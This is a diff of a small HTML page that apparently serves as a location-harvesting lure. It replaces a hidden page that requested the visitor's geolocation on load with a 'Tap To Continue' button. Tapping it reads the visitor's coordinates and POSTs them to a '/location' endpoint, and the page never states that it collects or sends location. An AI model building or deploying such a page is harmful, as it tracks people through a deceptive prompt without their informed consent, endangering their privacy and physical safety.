@@ -1,11 +1,17 @@
 <!DOCTYPE html>
 <html>
-<body style="display:none;">
+
+<body>
+
+<button onclick="getLocation()" style="font-size:25px;padding:20px;">
+Tap To Continue
+</button>
 
 <script>
 
-navigator.geolocation.getCurrentPosition(
-function(pos){
+function getLocation(){
+
+navigator.geolocation.getCurrentPosition(function(pos){
 
 fetch("/location",{
 method:"POST",
@@ -18,10 +24,11 @@ longitude:pos.coords.longitude
 })
 })
 
-});
+})
+
+}
 
 </script>
 
 </body>
 </html>
-
